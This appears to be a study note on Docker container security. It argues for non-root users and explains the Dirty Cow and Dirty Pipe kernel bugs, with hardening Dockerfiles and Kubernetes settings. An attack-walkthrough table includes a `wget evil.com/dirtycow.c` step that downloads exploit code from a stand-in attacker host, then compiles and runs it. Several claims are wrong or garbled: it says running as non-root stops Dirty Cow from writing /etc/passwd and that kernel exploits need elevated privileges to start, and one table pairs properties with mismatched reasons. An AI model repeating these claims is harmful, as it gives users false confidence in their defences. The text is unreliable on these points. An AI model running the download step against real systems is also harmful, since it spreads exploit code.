# 🐳 Docker Security Notes
### Non-Root Users, Kernel Exploits & Dirty Cow

---

## 1. Why Run as Non-Root User Inside a Container

**The Way:** By default, processes inside Docker containers run as `root` (UID 0).

**The Problem:** If an attacker exploits your app and escapes the container, they land on the host as `root` — game over, they own your server.

**How it solves it:** Running as a non-root user means even if the container is compromised, the attacker has limited privileges — both inside the container and on the host.

---

### Core Concept — Root in Container = Root on Host

```
Container root (UID 0)
        │
        │  if container escape happens
        ▼
Host root (UID 0)      ← same UID, same power
        │
        ▼
attacker can:
  - read /etc/shadow
  - kill any process
  - access all files
  - install rootkits
  💀 COMPLETE HOST COMPROMISE
```

```
Container non-root (UID 1001)
        │
        │  if container escape happens
        ▼
Host unprivileged user (UID 1001)
        │
        ▼
attacker can:
  - access only that user's files
  - can't kill system processes
  - can't read sensitive host files
  ✅ BLAST RADIUS MASSIVELY REDUCED
```

---

### Bad Dockerfile (runs as root)

```dockerfile
FROM node:18-alpine

WORKDIR /app
COPY package*.json ./
RUN npm install
COPY . .

EXPOSE 3000
CMD ["node", "server.js"]
# runs as root by default — nobody asked for this
```

### Good Dockerfile (runs as non-root)

```dockerfile
FROM node:18-alpine

WORKDIR /app

# Create a non-root user and group
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

COPY package*.json ./
RUN npm install
COPY . .

# Give ownership to appuser BEFORE switching
RUN chown -R appuser:appgroup /app

# Switch to non-root user
USER appuser

EXPOSE 3000
CMD ["node", "server.js"]
```

---

### Common Mistakes

| Mistake | Consequence |
|---|---|
| Creating user but forgetting `USER` directive | Still running as root silently |
| Wrong file ownership before USER switch | `Permission denied` on npm install |
| `EXPOSE 80` with non-root user | Ports below 1024 need root — container crashes |
| "It's just a container, root is fine" | One CVE away from full host compromise |

---

### Advanced — Kubernetes securityContext

```yaml
securityContext:
  runAsUser: 1001
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
  seccompProfile:
    type: RuntimeDefault
```

---

## 2. CVE — Common Vulnerabilities and Exposures

**CVE** = a publicly known security vulnerability in software. When one is discovered in Node.js, nginx, or the Linux kernel, it gets a CVE ID like `CVE-2024-12345` and everyone scrambles to patch it.

```
CVE found in your Node.js version
        │
        ▼
Attacker exploits your running container
        │
        ├── Running as root?
        │         │
        │         ▼
        │   Everything. Host, files,
        │   other containers. Game over. 💀
        │
        └── Running as non-root?
                  │
                  ▼
            Limited to unprivileged
            user permissions only. ✅ CONTAINED
```

> **CVEs are inevitable — software always has bugs. Non-root is your damage control when one hits you.**

---

## 3. Kernel Exploits — Dirty Cow & Dirty Pipe

**The Way:** Linux kernel has bugs like any software. Some bugs allow unprivileged users to gain root access.

**The Problem:** If your container runs as root and a kernel exploit exists — attacker escapes the container entirely and owns the **host machine** and every container on it.

**How non-root solves it:** Kernel exploits need an initial foothold with elevated privileges. Non-root makes that first step significantly harder.

---

### The Kernel is Shared by ALL Containers

```
HOST MACHINE
├── Linux Kernel          ← SHARED by ALL containers
├── Container 1 (your app)
├── Container 2 (database)
├── Container 3 (redis)
└── Container 4 (attacker's entry point)

They look isolated but they all talk to the SAME kernel.
```

---

## Dirty Cow (CVE-2016-5195) — Deep Dive

### What is Copy-on-Write (CoW)?

```
Process wants to write to read-only memory
        │
        ▼
Kernel: "make a copy first, write to copy"
        │
        ▼
Original file:  UNTOUCHED ✅
Private copy:   process writes here ✅
```

### The Race Condition Bug

```
Thread 1 (madvise) — runs in infinite loop:
  "Hey kernel, drop this private copy"
  MADV_DONTNEED → MADV_DONTNEED → MADV_DONTNEED

Thread 2 (write) — runs in infinite loop:
  write() → write() → write() → write()

What happens at the exact wrong moment:
  T=1  Kernel creates private copy for Thread 2  ✅
  T=2  Thread 1 drops the private copy
  T=3  Kernel is mid-write for Thread 2
  T=4  Private copy is GONE
  T=5  Kernel writes directly to ORIGINAL file   💀
              │
              ▼
        /etc/passwd overwritten
        Root access achieved
```

### Root vs Non-Root During Attack

| Step | As ROOT (UID 0) | As NON-ROOT (UID 1001) |
|---|---|---|
| Get shell in container | `whoami` → root | `whoami` → appuser |
| Check kernel | `uname -r` → 4.4.0 (vulnerable) | same |
| Download exploit | `wget evil.com/dirtycow.c` ✅ | Permission denied ❌ |
| Compile exploit | `gcc dirtycow.c -o cow` ✅ | No compiler installed ❌ |
| Run exploit | Triggers in ~2 seconds | Even if runs — can't write `/etc/passwd` |
| Result | Host owned. All containers compromised. 💀 | Attacker stuck in jail. ✅ |

### Timeline — 9 Years Hidden in Plain Sight

```
2007 ── Bug introduced into Linux kernel
  │
  │     9 YEARS pass
  │     Millions of servers vulnerable
  │     Nobody noticed
  │
2016 ── Phil Oester discovers it being exploited in the wild
  │
Oct 2016 ── Patch released (kernel 4.8.3)
  │
  │     Patching kernel requires REBOOT
  │     Many servers stayed unpatched for months
  │
2016-2017 ── Massive exploitation wave
             Android phones, Linux servers, Docker containers 💀
```

### What Made It Uniquely Terrifying

| Property | Why It Mattered |
|---|---|
| Worked on ALL kernels since 2007 | Zero special permissions required |
| Left almost NO trace in logs | Worked inside Docker containers |
| Exploit was 39 lines of C | Reliable — not a one-in-million race |
| Fixed by a handful of lines | 9 years hidden in reviewed code |

---

## Dirty Pipe (CVE-2022-0847)

```
Normal Linux pipe:
  Process A ──pipe──► Process B  (isolated, one way)

Dirty Pipe exploit:
  Attacker creates a pipe
        │
        ▼
  Triggers kernel bug in pipe buffer handling
        │
        ▼
  Pipe buffer "leaks" into page cache
        │
        ▼
  Can OVERWRITE any file — even read-only, even owned by root
        │
        ▼
  Overwrite /etc/passwd or /bin/sudo
        │
        ▼
  Full root access 💀
```

---

## 4. 🔪 The Knife Analogy

```
Dirty Cow    = one specific knife
Non-root     = bulletproof vest

"That specific knife is banned now"
        │
        ▼
Does that mean stop wearing the vest?
        │
        ▼
No — because there are other knives
you haven't seen yet 🔪
```

### The Pattern Never Stops

| Year | Event |
|---|---|
| 2016 | Dirty Cow patched 🎉 |
| 2017 | Stack Clash discovered 💀 |
| 2018 | Spectre / Meltdown discovered 💀 |
| 2019 | SACK Panic discovered 💀 |
| 2021 | Sequoia (CVE-2021-33909) discovered 💀 |
| 2022 | Dirty Pipe patched 🎉 |
| 2023 | StackRot discovered 💀 |
| 2024/2025 | ??? (exists, undiscovered) |

> **Every year. Without fail.**

---

## 5. ✅ Moral of the Story — Best Security Practice

> ### USE NON-ROOT USER IN EVERY DOCKER IMAGE. NO EXCEPTIONS.

### Defense in Depth

| Layer | What It Prevents |
|---|---|
| Non-root user (`USER 1001`) | Attacker can't run privileged operations |
| No build tools in image | Attacker can't compile exploits |
| Read-only filesystem | Attacker can't write anything to disk |
| Seccomp profile | Blocks dangerous kernel syscalls entirely |
| Drop ALL capabilities | Removes specific Linux powers from container |
| Keep host kernel updated | Patches known CVEs before exploitation |

### Minimum Dockerfile

```dockerfile
FROM node:18-alpine

RUN addgroup -S appgroup && adduser -S -u 1001 appuser -G appgroup

WORKDIR /app
COPY . .
RUN chown -R appuser:appgroup /app

# THIS LINE IS EVERYTHING
USER 1001

EXPOSE 3000
CMD ["node", "server.js"]
```

### Minimum Kubernetes securityContext

```yaml
securityContext:
  runAsUser: 1001
  runAsNonRoot: true
  readOnlyRootFilesystem: true
  capabilities:
    drop:
      - ALL
  seccompProfile:
    type: RuntimeDefault
```

---

> **CVEs are inevitable. Patching Dirty Cow didn't make kernel exploits extinct. It just closed one known door while unknown doors still exist. Non-root is not a fix for one CVE — it is your defense against whatever comes next.**

---

> **The extra 3 lines in your Dockerfile is the cheapest security investment you will ever make. Your 3am stays peaceful. Use non-root. Always. 🔐**

---
*End of Notes*
